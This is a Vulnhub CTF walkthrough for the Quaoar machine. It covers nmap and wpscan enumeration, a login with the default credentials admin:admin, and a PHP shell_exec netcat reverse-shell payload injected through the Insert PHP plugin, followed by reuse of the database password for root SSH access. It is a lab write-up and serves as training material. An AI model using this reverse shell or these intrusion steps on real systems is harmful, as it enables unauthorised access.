[Quaoar](https://www.vulnhub.com/entry/hackfest2016-quaoar,180/) turned out to be one of the easiest machine I have encountered on Vulnhub. The discription of this VM says:
>Welcome to Quaoar
>
>This is a vulnerable machine i created for the Hackfest 2016 CTF http://hackfest.ca/
>
>Difficulty : Very Easy
>
>Tips:
>
>Here are the tools you can research to help you to own this machine. nmap dirb / dirbuster / BurpSmartBuster nikto wpscan hydra Your Brain Coffee Google :)
>
>Goals: This machine is intended to be doable by someone who is interested in learning computer security There are 3 flags on this machine 1. Get a shell 2. Get root access 3. There is a post exploitation flag on the box
>
>Feedback: This is my first vulnerable machine, please give me feedback on how to improve ! @ViperBlackSkull on Twitter simon.nolet@hotmail.com Special Thanks to madmantm for testing

When I run the VM, the banner reads as follows:
```plain
Welcome to Quaoar

This is a vulnerable machine i created for the Hackfest 2016 CTF
http://hackfest.ca/

Difficulty : Very Easy

Tips:

Here are the tools you can research to help you to own this machine.
nmap
dirb / dirbuster / BurpSmartBuster
nikto
wpscan
hydra
Your Brain
Coffee
Google :)


Goals: This machine is intended to be doable by someone who is interested in learning computer security 
There are 3 flags on this machine
1. Get a shell
2. Get root access
3. There is a post exploitation flag on the box




Feedback: This is my first vulnerable machine, please give me feedback on how to improve !
@ViperBlackSkull on Twitter
simon.nolet@hotmail.com
Special Thanks to madmantm for testing

To reach Quaoar use this ip address:
192.168.186.135

```

Running nmap following services are found:

```
root@kali:~# nmap -sV -p- 192.168.186.135 -T5
...snip...
PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 5.9p1 Debian 5ubuntu1 (Ubuntu Linux; protocol 2.0)
53/tcp  open  domain      ISC BIND 9.8.1-P1
80/tcp  open  http        Apache httpd 2.2.22 ((Ubuntu))
110/tcp open  pop3        Dovecot pop3d
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
143/tcp open  imap        Dovecot imapd
445/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
993/tcp open  ssl/imap    Dovecot imapd
995/tcp open  ssl/pop3    Dovecot pop3d
MAC Address: 00:0C:29:8C:CC:7D (VMware)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

```

Multiple interesting targets to explore in the nmap scan but I know from the banner that the site uses wordpress and wpscan might come in handy. Following site is hosted on port 80:
![image](/Walkthrough/images/quaoar_browser.jpg)

/robots.txt has an entry for `/wordpress`. Running wpscan on the site finds a number of vulnerablities but nothing that can be directly exploited:
```shell
root@kali:~# wpscan 192.168.186.135/wordpress
...snip...
[!] The WordPress 'http://192.168.186.135/wordpress/readme.html' file exists exposing a version number
[+] Interesting header: SERVER: Apache/2.2.22 (Ubuntu)
[+] Interesting header: X-POWERED-BY: PHP/5.3.10-1ubuntu3
[+] XML-RPC Interface available under: http://192.168.186.135/wordpress/xmlrpc.php
[!] Upload directory has directory listing enabled: http://192.168.186.135/wordpress/wp-content/uploads/
[!] Includes directory has directory listing enabled: http://192.168.186.135/wordpress/wp-includes/

[+] WordPress version 3.9.14 identified from advanced fingerprinting (Released on 2016-09-07)
[!] 5 vulnerabilities identified from the version number

[!] Title: WordPress 2.9-4.7 - Authenticated Cross-Site scripting (XSS) in update-core.php
    Reference: https://wpvulndb.com/vulnerabilities/8716
    Reference: https://github.com/WordPress/WordPress/blob/c9ea1de1441bb3bda133bf72d513ca9de66566c2/wp-admin/update-core.php
    Reference: https://wordpress.org/news/2017/01/wordpress-4-7-1-security-and-maintenance-release/
[i] Fixed in: 4.7.1

[!] Title: WordPress 3.4-4.7 - Stored Cross-Site Scripting (XSS) via Theme Name fallback
    Reference: https://wpvulndb.com/vulnerabilities/8718
    Reference: https://www.mehmetince.net/low-severity-wordpress/
    Reference: https://wordpress.org/news/2017/01/wordpress-4-7-1-security-and-maintenance-release/
    Reference: https://github.com/WordPress/WordPress/commit/ce7fb2934dd111e6353784852de8aea2a938b359
[i] Fixed in: 4.7.1

[!] Title: WordPress <= 4.7 - Post via Email Checks mail.example.com by Default
    Reference: https://wpvulndb.com/vulnerabilities/8719
    Reference: https://github.com/WordPress/WordPress/commit/061e8788814ac87706d8b95688df276fe3c8596a
    Reference: https://wordpress.org/news/2017/01/wordpress-4-7-1-security-and-maintenance-release/
[i] Fixed in: 4.7.1

[!] Title: WordPress 2.8-4.7 - Accessibility Mode Cross-Site Request Forgery (CSRF)
    Reference: https://wpvulndb.com/vulnerabilities/8720
    Reference: https://github.com/WordPress/WordPress/commit/03e5c0314aeffe6b27f4b98fef842bf0fb00c733
    Reference: https://wordpress.org/news/2017/01/wordpress-4-7-1-security-and-maintenance-release/
[i] Fixed in: 4.7.1

[!] Title: WordPress 3.0-4.7 - Cryptographically Weak Pseudo-Random Number Generator (PRNG)
    Reference: https://wpvulndb.com/vulnerabilities/8721
    Reference: https://github.com/WordPress/WordPress/commit/cea9e2dc62abf777e06b12ec4ad9d1aaa49b29f4
    Reference: https://wordpress.org/news/2017/01/wordpress-4-7-1-security-and-maintenance-release/
[i] Fixed in: 4.7.1
...snip...
```

Trying simple/guessable credentials in /wp-admin folder I am able to login with `admin:admin`. Getting a web shell from there is quite easy. I install [Insert PHP](https://en-nz.wordpress.org/plugins/insert-php/) plugin by directly searching for it and downloading it in wordpress since I have configured the machine to run on NAT and it has internet access. Otherwise we could download and upload the plugin also. Once installed, I enter the following code in Insert Php tags in a post to fetch a reverse shell:

```PHP
<pre>
[insert_php]
shell_exec('sh -c rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.186.134 443 >/tmp/f');
[/insert_php]
</pre>
```

The shell is executed by browsing to the page into which I have injected the reverse shell code `192.168.186.135/wordpress/?p=1`. We recieve a shell running as user www-data:

![image](/Walkthrough/images/quaoar_revshell.jpg)

And the first flag is found:
```bash
www-data@Quaoar:/var/www/wordpress$ cat /home/wpadmin/flag.txt
cat /home/wpadmin/flag.txt
2bafe61f03117ac66a73c3c514de796e
```

Now we can read `wp-config.php` which has DB credentials:
```php
// ** MySQL settings - You can get this info from your web host ** //
/** The name of the database for WordPress */
define('DB_NAME', 'wordpress');

/** MySQL database username */
define('DB_USER', 'root');

/** MySQL database password */
define('DB_PASSWORD', 'rootpassword!');

/** MySQL hostname */
define('DB_HOST', 'localhost');
```

I login into the DB but do not find anything useful. To my surprise these credentials also work for root SSH login and we have the second flag now:
![Root login](/Walkthrough/images/quaoar_root.jpg)
